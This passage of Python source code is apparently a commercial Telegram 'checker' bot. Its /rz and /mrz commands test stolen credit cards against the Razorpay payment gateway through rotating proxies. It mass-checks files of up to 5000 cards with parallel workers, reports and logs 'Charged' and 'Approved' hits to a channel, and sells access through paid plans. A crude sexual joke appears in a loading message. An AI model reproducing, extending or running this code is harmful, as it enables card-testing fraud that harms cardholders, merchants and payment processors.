        f"⏳ 𝐀 𝐘 𝐀 𝐍 𝐎 〆 𝐕𝟐 𝗜𝗦 𝗪𝗢𝗥𝗞𝗜𝗡𝗚 . . . .\n\n"
        f"💳 Card » <code>{card}</code>\n"
        f"🌐 Gateway » 𝙍𝙖𝙯𝙤𝙧𝙥𝙖𝙮\n"
        f"🔍 Status » 𝘼 𝙎𝙚𝙭𝙮 𝙂𝙞𝙧𝙡 𝙄𝙨 𝙋𝙧𝙚𝙥𝙖𝙧𝙞𝙣𝙜 𝙃𝙚𝙧𝙨𝙚𝙡𝙛 𝙏𝙤 𝙃𝙖𝙫𝙚 𝙎𝙚𝙭 𝙒𝙞𝙩𝙝 𝙔𝙤𝙪...\n\n"
        f"⚡ Powered by @AYANOOXD"
    )
    status_msg = await event.reply(premium_emoji(rz_loading), parse_mode='html')

    # Mark user busy for single /rz
    _rz_single_key = f"rz_single_{user_id}_{status_msg.id}"
    user_active_check[user_id] = {'type': 'rz', 'session_key': _rz_single_key, 'chat_id': event.chat_id, 'msg_id': status_msg.id}

    try:
        result = await check_razorpay_with_retry(card, proxies, max_retries=3)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        increment_cc_used(user_id)

        if result['status'] == 'Charged':
            status_header = "💎 𝑪𝑯𝑨𝑹𝑮𝑬𝑫"
            await log_hit_to_channel(result, 'Charged', user_id, username, check_type="Single Razorpay Check")
        elif result['status'] == 'Approved':
            status_header = "✅ 𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫"
            await log_hit_to_channel(result, 'Approved', user_id, username, check_type="Single Razorpay Check")
        elif result['status'] == 'Declined':
            status_header = "❌ 𝑫𝑬𝑪𝑳𝑰𝑵𝑬𝑫"
        elif result['status'] in ('Dead', 'Site Error'):
            # FIX: Dead/Site Error shown as ⚠️ DEAD SITE, not DECLINED
            status_header = "⚠️ 𝑫𝑬𝑨𝑫 𝑺𝑰𝑻𝑬"
        else:
            status_header = "❌ 𝑫𝑬𝑪𝑳𝑰𝑵𝑬𝑫"

        resp_text = (
            f"{status_header}\n\n"
            f"💳 CC <code>{result['card']}</code>\n\n"
            f"🛒 Gateway Razorpay\n"
            f"📝 Response {_display_message(result['message'])}\n"
            f"💸 Price {result.get('price', '₹1')}\n\n"
            f"🆔 BIN Info {brand} - {bin_type} - {level}\n"
            f"🏦 Bank {bank}\n"
            f"🥰 Country {country} {flag}\n\n"
            f"💡 Made by @AYANOOXD"
        )
        await safe_edit(status_msg, resp_text)

    except Exception as e:
        await safe_edit(status_msg, f"❌ Error: {e}")
    finally:
        # Release one-at-a-time lock for single /rz
        if user_id in user_active_check and user_active_check.get(user_id, {}).get('type') == 'rz':
            del user_active_check[user_id]


# ─── RAZORPAY MASS CHECK ─────────────────────────────────────────────────────

@bot.on(events.NewMessage(pattern=r'^/mrz(?:\s|$)'))
async def mrz_command(event):
    user_id = event.sender_id
    chat_id = event.chat_id  # group mein = group ID, private mein = user ID

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except Exception:
        username = f"user_{user_id}"

    # Razorpay gate: PREMIUM and VIP only
    if user_id not in ADMIN_ID:
        u_plan = load_users_data().get(str(user_id), {}).get('plan', 'FREE')
        if u_plan not in ('PREMIUM', 'VIP'):
            await event.reply(premium_emoji(
                "🥇 <b>PREMIUM / VIP Only</b>\n\n"
                "The Razorpay gate is restricted to\n"
                "<b>🥇 PREMIUM</b> and <b>👑 VIP</b> plan users.\n\n"
                "💡 Upgrade your plan: /plan"
            ), parse_mode='html')
            return

    check_status = can_check(user_id, event.is_private)
    if check_status == 'banned':
        await event.reply(premium_emoji(
            "𝗬𝗢𝗨 𝗔𝗥𝗘 𝗕𝗔𝗡𝗡𝗘𝗗\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "🚫  You have been banned from using this bot.\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "💡  Contact @AYANOOXD if this is a mistake"
        ), parse_mode='html')
        return
    if check_status == 'no_plan':
        await event.reply(premium_emoji("❌ <b>No Plan Found</b>\n\nUse /plan to see plans."), parse_mode='html')
        return
    if check_status == 'expired':
        await event.reply(premium_emoji("⏰ <b>Plan Expired</b>\n\nUse /plan to purchase."), parse_mode='html')
        return
    if check_status == 'group_only':
        await event.reply(premium_emoji(
            f"🆓 <b>Free Plan — Group Only</b>\n\nJoin group to check:\n{GROUP_LINK}"
        ), buttons=[[Button.url("🏠 Join Group", GROUP_LINK, style="success")]], parse_mode='html')
        return
    # ─── ONE CHECK AT A TIME RULE (Razorpay) ─────────────────────────────────
    if user_id in user_active_check:
        current = user_active_check[user_id]
        session_type = "🛒 Shopify" if current['type'] == 'chk' else "💳 Razorpay"
        await event.reply(premium_emoji(
            f"🚫 <b>Already Running!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"⚡ <b>Active Session:</b>  {session_type}\n\n"
            f"You already have a check running.\n"
            f"Wait for it to finish, then start a new one.\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 Use STOP button to cancel the current check."
        ), parse_mode='html')
        return
    # ──────────────────────────────────────────────────────────────────────────

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Please reply to a <code>.txt</code> file containing cards."), parse_mode='html')
        return

    reply_msg = await event.get_reply_message()
    if not is_text_reply_file(reply_msg):
        await event.reply(premium_emoji("❌ Please reply to a <code>.txt</code> file."), parse_mode='html')
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji("🔄 Processing your file..."), parse_mode='html')
    file_path = await reply_msg.download_media()

    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()

    # Always clean up downloaded file immediately after reading (disk leak fix)
    try:
        os.remove(file_path)
    except Exception:
        pass

    cards = extract_cc(content)

    if not cards:
        await safe_edit(status_msg, "❌ No valid cards found in file.")
        return

    if len(cards) > 5000:
        cards = cards[:5000]

    # Per-session CC limit for ALL plans (FREE + Paid) — Razorpay
    if user_id not in ADMIN_ID:
        users_data_rz = load_users_data()
        user_plan_rz  = users_data_rz.get(str(user_id), {}).get('plan', 'FREE')
        plan_data_rz = PLANS.get(user_plan_rz, PLANS['FREE'])

        SESSION_LIMIT_RZ = plan_data_rz['cc_limit']  # per-session max

        if len(cards) > SESSION_LIMIT_RZ:
            total_input = len(cards)
            cards = cards[:SESSION_LIMIT_RZ]
            plan_emoji = plan_data_rz.get('emoji', '💎')
            await safe_edit(status_msg,
                f"{plan_emoji} <b>{user_plan_rz} Plan</b> — Tumhara {user_plan_rz} plan sirf <b>{SESSION_LIMIT_RZ}</b> cards per session check kar sakta hai.\n"
                f"📊 Total in file: {total_input}  ›  Checking first {SESSION_LIMIT_RZ}\n"
                f"💡 Session khatam hone ke baad phir se /mrz karo — limit reset ho jayegi!",
                parse_mode='html'
            )
            await asyncio.sleep(2)

    total_cards = len(cards)
    rz_plan_workers = get_user_concurrency(user_id)
    _rz_plan_name = load_users_data().get(str(user_id), {}).get('plan', 'FREE') if user_id not in ADMIN_ID else 'ADMIN'
    await safe_edit(status_msg, f"🔥 Starting Razorpay check for <b>{total_cards}</b> cards...\n⚡ Plan: <b>{_rz_plan_name}</b> | Workers: <b>{rz_plan_workers}</b>")

    session_key = f"rz_{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}

    # Register user for one-at-a-time check
    user_active_check[user_id] = {
        'type': 'mrz',
        'session_key': session_key,
        'chat_id': chat_id,
        'msg_id': status_msg.id
    }

    all_results = {
        'charged': [], 'approved': [], 'dead': [],
        'total': total_cards, 'checked': 0,
        'start_time': time.time(),
        'last_card': '', 'last_response': '', 'last_price': '-', 'last_gateway': 'Razorpay',
    }

    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)

        last_update_time = [time.time()]
        results_lock = asyncio.Lock()

        # ── Plan-based concurrency for /mrz (sequential + parallel) ──
        max_concurrent_rz = get_user_concurrency(user_id)

        async def rz_worker():
            """True parallel Razorpay worker — grabs cards from queue until empty or stopped."""
            while session_key in active_sessions:
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break

                session_state = active_sessions.get(session_key)
                if not session_state:
                    queue.task_done()
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(0.5)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        queue.task_done()
                        return

                _t0 = time.time()
                async with _global_api_semaphore:
                    res = await check_razorpay_with_retry(card, proxies, max_retries=1)
                record_bot_response_time(time.time() - _t0)

                async with results_lock:
                    all_results['checked'] += 1
                    all_results['last_card'] = card
                    all_results['last_response'] = res.get('message', '')
                    all_results['last_price'] = res.get('price', '₹1')

                    if res['status'] == 'Charged':
                        all_results['charged'].append(res)
                    elif res['status'] == 'Approved':
                        all_results['approved'].append(res)
                    else:
                        all_results['dead'].append(res)

                if res['status'] == 'Charged':
                    await send_realtime_hit(chat_id, res, 'Charged', username)
                    await log_hit_to_channel(res, 'Charged', user_id, username, check_type="Razorpay Mass Check")
                elif res['status'] == 'Approved':
                    await send_realtime_hit(chat_id, res, 'Approved', username)
                    await log_hit_to_channel(res, 'Approved', user_id, username, check_type="Razorpay Mass Check")

                queue.task_done()

                now = time.time()
                checked = all_results['checked']
                if (now - last_update_time[0] >= 4.0) or (checked % 5 == 0):
                    last_update_time[0] = now
                    if session_key in active_sessions:
                        try:
                            await update_progress(chat_id, user_id, status_msg.id, all_results, checked)
                        except Exception:
                            pass

        # ── True parallel Razorpay workers via asyncio.gather ─────────────────
        rz_worker_tasks = [asyncio.create_task(rz_worker()) for _ in range(max_concurrent_rz)]

        async def _mrz_stop_monitor():
            """Cancels Razorpay workers instantly when STOP is pressed."""
            while True:
                if session_key not in active_sessions:
                    for w in rz_worker_tasks:
                        if not w.done():
                            w.cancel()
                    return
                await asyncio.sleep(0.3)

        _mrz_monitor = asyncio.create_task(_mrz_stop_monitor())
        await asyncio.gather(*rz_worker_tasks, return_exceptions=True)
        _mrz_monitor.cancel()
        try:
            await _mrz_monitor
        except asyncio.CancelledError:
            pass

        if session_key in active_sessions:
            await update_progress(chat_id, user_id, status_msg.id, all_results, all_results['checked'])

    except Exception as e:
        await bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        # FIX #8: Unregister from traffic management (was missing in /mrz handler — only /chk had it)
        await unregister_mass_user(user_id)

        if session_key in active_sessions:
            del active_sessions[session_key]

        # Clean up one-at-a-time lock
        if user_id in user_active_check:
            del user_active_check[user_id]

        # Batch update CC usage once at session end
        total_checked = len(all_results['charged']) + len(all_results['approved']) + len(all_results['dead'])
        if total_checked > 0:
            increment_cc_used(user_id, total_checked)

        try:
            await status_msg.delete()
        except Exception:
            pass

        # Only send final results if at least some cards were checked (avoid empty summary after crash)
        if total_checked > 0:
            await send_final_results(chat_id, all_results)


@bot.on(events.CallbackQuery(pattern=rb"stop_(\d+)"))
async def stop_handler(event):
    match = event.pattern_match
    user_id = int(match.group(1).decode())
    # Security fix: only the session owner can stop it
    if event.sender_id != user_id:
        await event.answer("\u274c This is not your session.", alert=True)
        return
    message_id = event.message_id
    # Check both /chk key format and /mrz key format
    session_key       = f"{user_id}_{message_id}"
    rz_session_key    = f"rz_{user_id}_{message_id}"
    cc_session_key    = f"cc_{user_id}_{message_id}"
    rz_single_key     = f"rz_single_{user_id}_{message_id}"
    found_key = (
        session_key    if session_key    in active_sessions else
        rz_session_key if rz_session_key in active_sessions else
        cc_session_key if cc_session_key in active_sessions else
        rz_single_key  if rz_single_key  in active_sessions else
        None
    )
    if found_key:
        del active_sessions[found_key]
        # Also clean one-at-a-time lock when user manually stops
        if user_id in user_active_check:
            del user_active_check[user_id]
        await event.answer("Stopped", alert=True)
        try:
            await event.edit(premium_emoji("🛑 Checking stopped by user."), parse_mode='html')
        except Exception:
            pass
    else:
        await event.answer("Already finished or not found.", alert=True)


async def _close_http_session():
    global _http_session
    if _http_session is not None and not _http_session.closed:
        await _http_session.close()


print("✅ Bot started successfully!")
try:
    bot.run_until_disconnected()
finally:
    bot.loop.run_until_complete(_close_http_session())
